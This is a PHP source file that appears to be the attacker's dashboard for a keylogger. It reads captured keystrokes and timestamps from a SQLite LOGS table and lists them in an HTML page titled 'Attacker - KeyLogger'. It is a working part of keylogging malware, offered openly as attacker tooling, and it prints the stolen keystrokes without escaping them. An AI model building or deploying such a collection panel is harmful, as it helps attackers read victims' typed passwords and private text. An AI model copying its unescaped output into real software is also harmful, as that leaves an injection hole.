<?php
require 'vendor/autoload.php';

use App\SQLiteConnection;
use App\SQLiteCreateTable;

$pdo = (new SQLiteConnection())->connect();
$createTable = new SQLiteCreateTable($pdo);
$createTable->createStartUpTables();

$stmt = $pdo->query("SELECT DATE, KEYS FROM LOGS order by DATE");
$logs = [];
while ($row = $stmt->fetch(\PDO::FETCH_ASSOC)) {
    $logs[] = [
            'datetime' => $row['DATE'],
            'keys' => $row['KEYS']
    ];
}
?>
<html lang="eng">
<head>
    <title>Attacker - KeyLogger</title>
    <style>
        table {
            border-collapse: collapse;
            width: 100%;
        }
        table td, table th {
            border: solid 1px;
            padding: 5px;
        }
    </style>
</head>
<body>
<table>
    <thead>
        <tr>
            <th>Datetime</th>
            <th>Keys Pressed</th>
        </tr>
    </thead>
    <tbody>
    <?php foreach ($logs as $log) : ?>
        <tr>
            <td><?php echo $log['datetime'] ?></td>
            <td><?php echo $log['keys'] ?></td>
        </tr>
    <?php endforeach; ?>
    </tbody>
</table>
</body>
</html>